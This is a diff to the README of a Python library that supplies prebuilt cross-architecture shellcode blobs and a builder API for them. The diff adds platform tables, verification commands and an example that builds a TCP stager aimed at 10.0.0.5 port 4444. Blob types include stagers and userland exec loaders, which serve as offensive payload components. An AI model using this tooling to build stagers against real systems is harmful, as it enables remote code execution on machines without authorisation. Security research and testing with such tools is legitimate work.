@@ -9,6 +9,10 @@ arbitrary payloads on multiple operating systems and architectures. Eliminates
 the need for hand-writing shellcode by providing tested, cross-platform PIC
 stubs through a simple Python API.
 
+The project ships prebuilt blob assets plus runners and verification tooling,
+so consumers can build configs and execute tested PIC stubs without needing to
+write per-architecture assembly.
+
 ## User Story
 
 ```text
@@ -17,6 +21,10 @@ It would be amazing if Opus just solved the problem for me and yeeted it into py
 ```
 
 ## Platform support
+
+Current Linux architecture coverage includes `x86_64`, `i686`, `aarch64`,
+`armv5_arm`, `armv5_thumb`, `armv7_thumb`, `s390x`, `mipsel32`, `mipsbe32`,
+`sparcv8`, `powerpc`, `ppc64le`, and `riscv64`.
 
 ### Architectures
 
@@ -32,12 +40,15 @@ It would be amazing if Opus just solved the problem for me and yeeted it into py
 | mipsel32 | little | 32 | uses_mmap2, needs_got_reloc |
 | mipsbe32 | big | 32 | uses_mmap2, needs_got_reloc |
 | sparcv8 | big | 32 | uses_mmap2 |
+| powerpc | big | 32 | uses_mmap2 |
+| ppc64le | little | 64 | |
+| riscv64 | little | 64 | openat_only |
 
 ### Operating systems
 
 | OS | Architectures | Blob types | Runner |
 |---|---|---|---|
-| Linux | x86_64, i686, aarch64, armv5_arm, armv5_thumb, armv7_thumb, s390x, mipsel32, mipsbe32, sparcv8 | hello, nacl_hello, nacl_client, nacl_server, stager_tcp, test_tcp_ok, test_pass, ul_exec | Direct execution via QEMU user-static |
+| Linux | x86_64, i686, aarch64, armv5_arm, armv5_thumb, armv7_thumb, s390x, mipsel32, mipsbe32, sparcv8, powerpc, ppc64le, riscv64 | hello, nacl_hello, nacl_client, nacl_server, stager_tcp, test_tcp_ok, test_pass, ul_exec | Direct execution via QEMU user-static |
 | FreeBSD | x86_64, i686, aarch64, armv5_arm, armv5_thumb, armv7_thumb, mipsel32, mipsbe32 | hello, nacl_hello, nacl_client, nacl_server, stager_tcp, test_tcp_ok, test_pass, ul_exec | Translating loader: patches FreeBSD syscall numbers to Linux equivalents at load time |
 | Windows | x86_64, i686, aarch64 | hello_windows, alloc_jump | Mock TEB/PEB on Linux |
 
@@ -51,12 +62,37 @@ It would be amazing if Opus just solved the problem for me and yeeted it into py
 | `nacl_server` | Linux, FreeBSD | NaCl encrypted TCP server: bind, accept, decrypt message with crypto_secretbox, send encrypted ACK |
 | `nacl_client` | Linux, FreeBSD | NaCl encrypted TCP client: connect, encrypt and send message, decrypt ACK from server |
 
+## Python API
+
+```python
+import picblobs
+
+blob = (
+    picblobs.Blob("linux", "riscv64")
+    .stager_tcp()
+    .address("10.0.0.5")
+    .port(4444)
+    .build()
+)
+```
+
+The API is builder-based: choose a target OS/architecture, configure a blob
+type, then build the final bytes or inspect metadata.
+
 ## Quick start
 
 ```bash
 source sourceme
 ./buildall
 picblobs verify
+```
+
+Targeted verification for a single platform is also supported:
+
+```bash
+cd python
+./.venv/bin/python -m picblobs verify --os linux --arch ppc64le
+./.venv/bin/python -m picblobs verify --os linux --arch riscv64
 ```
 
 ## Documentation
